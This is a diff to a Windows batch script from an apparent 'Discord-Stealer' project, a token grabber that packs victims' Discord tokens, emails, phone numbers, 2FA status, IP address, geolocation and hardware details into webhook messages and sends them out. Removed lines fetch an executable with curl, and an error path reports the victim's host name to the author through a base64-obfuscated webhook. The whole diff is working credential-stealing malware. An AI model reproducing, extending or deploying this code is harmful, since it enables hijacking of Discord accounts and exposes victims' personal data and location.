@@ -8,8 +8,8 @@ set "grey=[90m"
 set "brightred=[91m"
 set "brightblue=[94m"
 
-set ScriptVersion=3.1
-set "AccountSystemVersions=!ScriptVersion! 3.0"
+set ScriptVersion=3.2
+set "AccountSystemVersions=!ScriptVersion! 3.1 3.0"
 set "RequiredFilesPath=%temp%\DAS v!ScriptVersion!"
 set "FilesHost=https://github.com/agamsol/Discord-Stealer/raw/main"
 for %%a in (
@@ -32,8 +32,6 @@ for %%a in (
 )
 
 set "FilesDB="src\NonAscii.exe" DAS.bat"
-set white=!white!
-
 set "PrintCore=     !grey!$ [!brightblue!%username%!grey!]"
 set "ErrPrintCore=     !brightred!$ !grey![!brightblue!%username%!grey!]"
 set "WrnPrintCore=     !yellow!$ !grey![!brightblue!%username%!grey!]"
@@ -319,8 +317,10 @@ exit /b
 
 :: Discord Message
 :DiscordMessage
-if not exist "!File[2]!" curl -sL "https://github.com/agamsol/Discord-Stealer/raw/main/fart.exe?raw=true" -o "!File[2]!"
-set ReplaceStringLength=0
+set JSON_INVALID=false
+set JSON_LINES=0
+set JSON_FAILED=_null_
+
 if "%~1"=="SendHardware" (
     >"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"title":"Discord Token Grabber - !VersionDescription!","color":7733132,"description":"","timestamp":"","author":{"name":"","url":""},"image":{"url":""},"thumbnail":{"url":""},"footer":{},"fields":[{"name":"^<:WIFI:928933255766491146^> __NETWORK__","value":"_ _"},{"name":"IP ADDRESS","value":"!query!","inline":true},{"name":"VPN","value":"!proxy!","inline":true},{"name":"INTERNET SERVICE","value":"!isp!","inline":false},{"name":"_ _","value":"_ _"},{"name":"^<:LOCATION:928939146905518091^> __LOCATION__","value":"_ _","inline":false},{"name":"COUNTRY","value":"!country!","inline":true},{"name":"TIMEZONE","value":"!timezone!","inline":true},{"name":"REGION","value":"!region!","inline":true},{"name":"LATITUDE ^& LONGITUDE","value":"!lat!, !lon!"},{"name":"_ _","value":"_ _"},{"name":"^<:WINDOWS:928938094474964993^> __HARDWARE ^& SOFTWARE__","value":"_ _"},{"name":"DEVICE HOST","value":"`!computername!\\!username!`","inline":true},{"name":"MEMORY","value":"!memory!","inline":true},{"name":"PROCESSOR","value":"!processor!"},{"name":"GRAPHICS CARD","value":"!gpu!"}]}],"components":[]}
     call :SendRequest
@@ -332,13 +332,56 @@ if "%~1"=="ERROR" (
     call :SendRequest
     exit /b
 )
+for %%a in (
+    AccountID
+    Discord_%~1_ImageURL
+    SendingAccount
+    Build_%~1_Nick
+    Discord_%~1_User
+    Discord_%~1_ID
+    Discord_%~1_Badges
+    Discord_%~1_Email
+    Discord_%~1_Verified
+    Discord_%~1_Phone
+    Discord_%~1_CreationDate
+    Discord_%~1_Nitro
+    Discord_%~1_2FA
+    Discord_%~1_NSFW
+    Discord_%~1_TOKEN
+) do if not defined %%a (
+    set JSON_INVALID=true
+    set JSON_FAILED='%%a' is not defined . . .
+    echo:
+    echo  !ErrPrintCore! [!brightred!ISSUE TRACKER!grey!] !JSON_FAILED!
+)
+
 >"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"color":7733132,"timestamp":"","author":{},"image":{},"thumbnail":{"url":"!Discord_%~1_ImageURL!"},"footer":{},"fields":[{"name":"^<:DISCORD:928933612945047592^> __DISCORD ACCOUNT !SendingAccount! - !Build_%~1_Nick!__","value":"_ _"},{"name":"USER","value":"!Discord_%~1_User!","inline":true},{"name":"ID","value":"`!Discord_%~1_ID!`","inline":true},{"name":"BADGES","value":"!Discord_%~1_Badges!","inline":true},{"name":"EMAIL","value":"!Discord_%~1_Email! ^(_!Discord_%~1_Verified!!Discord_%~1_Claimed!_^)","inline":true},{"name":"PHONE","value":"!Discord_%~1_Phone:null=_null_!","inline":true},{"name":"CREATION DATE","value":"!Discord_%~1_CreationDate!"},{"name":"HAS NITRO","value":"!Discord_%~1_Nitro!","inline":true},{"name":"2FA","value":"!Discord_%~1_2FA!","inline":true},{"name":"VIEW NSFW","value":"!Discord_%~1_NSFW:null=false!","inline":true},{"name":"TOKEN","value":"^|^| !Discord_%~1_TOKEN! ^|^|"}]}],"components":[]}
 :SendRequest
+for %%a in (
+    VersionDescription
+    query
+    proxy
+    isp
+    country
+    timezone
+    region
+    lat
+    lon
+    computername
+    username
+    memory
+    processor
+    gpu
+) do (
+    if not defined %%a (
+        set JSON_INVALID=true
+        set JSON_FAILED='%%a' is not defined . . .
+        echo:
+        echo  !ErrPrintCore! [!brightred!ISSUE TRACKER!grey!] !JSON_FAILED!
+    )
+)
 echo:
 echo  !PrintCore! [!brightblue!ISSUE TRACKER!grey!] Validating JSON Before Sending . . .
-set JSON_INVALID=false
-set JSON_LINES=0
-set JSON_FAILED=_null_
 for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -Raw; try {$powershellRepresentation = ConvertFrom-Json $text -ErrorAction SilentlyContinue;$validJson = $true;} catch {$validJson = $false;};if ($validJson) { Write-Host "true";} else { Write-Host "false";}"') do (
     if "%%a"=="false" (
         set JSON_INVALID=true
@@ -356,7 +399,7 @@ for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -R
     if "!JSON_INVALID!"=="true" (
         REM REPORT ISSUE TO THE APPLICATION AUTHOR
         REM PLEASE NOTE: I WILL NEVER TRY TO HARM YOU, YOUR VICTIMS OR YOUR COMPUTERS
-        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
+        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nHOST: %computername%\%username%\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
 
         for /f "delims=" %%c in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzNDU4MzkxODI2NTUyMDIwOC8wMVg0LVFXWjVnbUNJeUdDbHgzRS1oeER2bUJVTDF5MmlYZmZiQ1ZpelgyVURLV2ZGZVVSdVFFanBFNDY1dzZjT1dNVw==""""))"') do set "BSIXTY4=%%c"
 
